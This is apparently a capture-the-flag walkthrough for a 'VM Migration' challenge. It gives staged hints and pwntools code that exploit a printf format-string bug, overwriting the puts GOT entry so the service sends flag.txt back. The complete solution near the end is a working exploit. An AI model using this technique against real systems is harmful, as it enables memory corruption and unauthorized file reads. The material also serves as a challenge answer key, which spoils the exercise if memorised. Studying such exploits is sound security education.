VM Migration
============

## What to do?

Cost: 0%

Your task here is to analyze the source code, find a vulnerablity and write an exploit!
[pwntools](https://github.com/Gallopsled/pwntools)

## Finding the vulnerability

Cost: 10%

While reading the source code, it's easy to notice that `printf` is called with
a partially user controlled argument in line 79. The argument string is created
in line 75, and there is no limit on what the string can contain after the
"MIGRATE " string. This means that it is a classic printf vulnerability.

## Triggering the bug and exploit boilerplate

Cost: 20%

The skeleton of the exploit connects to the service, and specify a VM name that contains a format string using [pwntools](https://github.com/Gallopsled/pwntools):

    from pwn import *

    IP = '127.0.0.1'
    PORT = 8888

    r = remote(IP, PORT)

    r.sendlineafter('Select an option:', '1')
    r.sendlineafter('Enter the name of the VM to migrate', '%n%n%n')
    r.sendlineafter('Enter the destination IP and port (Format: <ip>:<port>)',
                    '1.1.1.1:10')

    r.interactive()

## Writing memory

Cost: 40%

The first step on the road to the successful exploit is turning the printf
vulnerability into an arbitrary memory write primitive that we can use later.

We will do it one byte at a time in this example, but it can be simplified by
writing two byte at a time. Finding out how to do that is left to the reader.

Finding the right indexed for the `%n` formatter needs some experimentation.
For this, using a pattern like `%x %x %x %x ...` first is often useful, since
it allows us to see what's in the Nth position on the stack from printf's
perspective.

The augmented exploit code:

    from pwn import *

    IP = '127.0.0.1'
    PORT = 8888

    r = remote(IP, PORT)

    where = 0x41414141 # Modify it to a real address to avoid segfault
    what = 0x42424242
    what_bytes = [ord(c) for c in p32(what)]
    what = what_bytes

    r.sendlineafter('Select an option:', '1')
    r.sendlineafter('Enter the name of the VM to migrate',
        # Addresses of the bytes of the puts GOT entry
        p32(where + 0) +
        p32(where + 1) +
        p32(where + 2) +
        p32(where + 3) +
        
        # Number of printed bytes so far: 0x18
        # Setting the puts pointer to what with the wraparound technique:
        '%6$0' + str((what[0] - 0x18    + 0x100) % 0x100) + 'd' + '%9$n' +
        '%6$0' + str((what[1] - what[0] + 0x100) % 0x100) + 'd' + '%10$n' +
        '%6$0' + str((what[2] - what[1] + 0x100) % 0x100) + 'd' + '%11$n' +
        '%6$0' + str((what[3] - what[2] + 0x100) % 0x100) + 'd' + '%12$n'
    )
    r.sendlineafter('Enter the destination IP and port (Format: <ip>:<port>)',
                    '1.1.1.1:10')

    r.interactive()

## What to write

Cost: 20%

Writing memory is a nice primitive, but now we need to find out what to use it
for. The easiest target is usually the GOT (Global Offset Table): it contains
writeable function pointer, and in this case, it is at a fixed location.

Our goal is to replace a function pointer with an other function pointer. The
replacement pointer may point to the attacker's shellcode, or, in some simpler
cases, it could point to an existing library function, or function present in
the program. In this case, a function defined in the program is sufficient as
replacement.

The `socket_send_file` function would be a perfect replacement: it sends the
specified file (in this case, it would be 'flag.txt') through the socket to us.

The only remaining question is: what to replace? We need a function that will
be called with a string argument, where the argument is controlled by us. Let's
have a look at `puts`: it's only called once, and the argument is attacker
controlled: perfect candidate!

## Complete solution


    from pwn import *

    IP = '127.0.0.1'
    PORT = 8888

    r = remote(IP, PORT)

    puts_got = 0x0804B030
    socket_send_file = 0x0804893C
    socket_send_file_bytes = [ord(c) for c in p32(socket_send_file)]

    r.sendlineafter('Select an option:', '1')
    r.sendlineafter('Enter the name of the VM to migrate',
        # Addresses of the bytes of the puts GOT entry
        p32(puts_got + 0) +
        p32(puts_got + 1) +
        p32(puts_got + 2) +
        p32(puts_got + 3) +
        
        # Number of printed bytes so far: 0x18
        # Setting the puts pointer to socket_send_file with the wraparound technique:
        '%6$0' + str((socket_send_file_bytes[0] - 0x18                      + 0x100) % 0x100) + 'd' + '%9$n' +
        '%6$0' + str((socket_send_file_bytes[1] - socket_send_file_bytes[0] + 0x100) % 0x100) + 'd' + '%10$n' +
        '%6$0' + str((socket_send_file_bytes[2] - socket_send_file_bytes[1] + 0x100) % 0x100) + 'd' + '%11$n' +
        '%6$0' + str((socket_send_file_bytes[3] - socket_send_file_bytes[2] + 0x100) % 0x100) + 'd' + '%12$n'
    )
    r.sendlineafter('Enter the destination IP and port (Format: <ip>:<port>)', '1.1.1.1:10')

    r.sendlineafter('Select an option:', '1')
    r.sendlineafter('Enter the name of the VM to migrate', 'flag.txt\n\x00');
    r.sendlineafter('Enter the destination IP and port (Format: <ip>:<port>)\n', '1.1.1.1:10')
    print r.recvuntil('Successfully migrated VM')[:-len('Successfully migrated VM')]

    r.sendlineafter('Select an option:', '2')
    r.close()